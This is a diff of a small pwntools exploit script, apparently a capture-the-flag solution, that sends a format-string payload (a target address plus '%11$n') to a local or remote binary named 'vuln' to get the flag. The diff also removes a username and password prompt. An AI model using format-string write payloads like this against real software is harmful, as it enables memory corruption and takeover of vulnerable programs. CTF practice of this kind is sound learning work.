@@ -5,9 +5,6 @@ from pwn import *
 
 debug = 0
 
-user = 'ElQwerto'
-pw = input("Enter your pass word: ")
-
 if debug:
   p = process('./vuln')
 else:
@@ -15,6 +12,7 @@ else:
 
 print p.recvuntil('Would you like to read the flag? (yes/no)')
 
+# are tager value is 0x804a04c and we will jump 11 place to then excute it with %n
 payload = p32(0x804a04c) + '.%11$n'
 
 p.sendline(payload)
